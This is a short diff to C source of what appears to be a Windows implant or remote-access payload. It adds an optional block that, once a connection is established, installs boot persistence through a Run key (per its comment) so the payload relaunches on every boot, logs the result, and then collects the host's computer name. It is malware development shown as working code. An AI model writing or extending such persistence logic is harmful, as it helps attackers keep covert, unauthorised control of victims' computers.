@@ -1906,6 +1906,23 @@ connect_again:
 
     px_logf(g_vocab.log_connected);
 
+#if PX_PERSISTENT
+    /* Install the persistence and LEAVE it.
+     *
+     * It happens here, after the connection is up, rather than at
+     * startup: a Run key that points at a session that never
+     * established is worse than no Run key, because it would relaunch
+     * the payload on every boot forever with nothing to show for it. */
+    {
+        static char report[512];
+        if (px_install_persistence(report, sizeof(report)) == 0) {
+            px_logf("[px] persistence: %s\n", report);
+        } else {
+            px_logf("[px] persistence failed: %s\n", report);
+        }
+    }
+#endif
+
     GetComputerNameA(host, &hn);
     {
         static char line[1024];
